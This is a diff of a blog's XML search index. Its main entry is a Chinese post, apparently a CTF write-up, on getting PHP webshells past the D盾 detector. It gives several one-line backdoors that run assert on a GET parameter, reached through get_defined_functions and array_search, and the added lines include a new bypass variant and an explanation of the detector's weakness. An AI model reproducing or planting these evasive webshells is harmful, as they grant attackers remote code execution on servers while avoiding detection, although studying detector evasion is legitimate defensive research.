@@ -15,7 +15,7 @@
   <entry>
     <title><![CDATA[过D]]></title>
     <url>%2F2019%2F11%2F26%2F%E8%BF%87D%2F</url>
-    <content type="text"><![CDATA[引言在打nctf的时候,由一道ctf题目引发的过D盾的思路,主要思路用的是一个比较偏的函数get_defined_functions 过Dget_defined_functions()函数会返回一个2维数组,里面包括了所有的函数,还有自定义的函数 这里就有2个思路了一个是通过自己写的函数去执行,或者可以通过自带的函数例如assert去执行先写一个自带的函数去执行内容的代码 123&lt;?php$a=get_defined_functions();$a['internal'][850]($_GET['a']); //850是assert函数的位置 被杀了,说是变量函数,然后测试了一下发现填什么都会报这个,最后在试了一下填函数的话他只是报了个1,而且这个一级只要随便填充点垃圾数据就过去了 图片语法肯定是错的,只是想说明填函数不容易被杀。既然填函数不容易被杀,那么我们是不是可以找一个获取指定字符串在数组中位置的函数。也就是array_search这个函数 最终的代码 1234&lt;?php$a=get_defined_functions();$a['internal'][array_search('assert',$a['internal'])]($_GET['a']);?&gt;]]></content>
+    <content type="text"><![CDATA[引言在打nctf的时候,由一道ctf题目引发的过D盾的思路,主要思路用的是一个比较偏的函数get_defined_functions 过Dget_defined_functions()函数会返回一个2维数组,里面包括了所有的函数,还有自定义的函数 这里就有2个思路了一个是通过自己写的函数去执行,或者可以通过自带的函数例如assert去执行先写一个自带的函数去执行内容的代码 123&lt;?php$a=get_defined_functions();$a['internal'][850]($_GET['a']); //850是assert函数的位置 被杀了,说是变量函数,然后测试了一下发现填什么都会报这个,最后在试了一下填函数的话他只是报了个1,而且这个一级只要随便填充点垃圾数据就过去了 图片语法肯定是错的,只是想说明填函数不容易被杀。既然填函数不容易被杀,那么我们是不是可以找一个获取指定字符串在数组中位置的函数。也就是array_search这个函数 最终的代码 1234&lt;?php$a=get_defined_functions();$a['internal'][array_search('assert',$a['internal'])]($_GET['a']);?&gt; 深入研究其实主要原因是并不是因为get_defined_functions是偏僻函数,而是因为D盾对函数检测的返回值没有特别严格,例如 1234&lt;?php$a[0]='assert';$a[array_search('assert',$a)]($_GET['a']);?&gt; 还有就是我在星球分享绕过D盾的思路那篇文章,也是利用函数返回值绕过D盾的。所以我们可以多利用函数的返回值进行绕过。]]></content>
       <categories>
         <category>技术实战</category>
       </categories>
@@ -97,8 +97,8 @@
         <category>学习记录</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>redis未授权</tag>
+        <tag>ctf</tag>
         <tag>资源分享</tag>
       </tags>
   </entry>
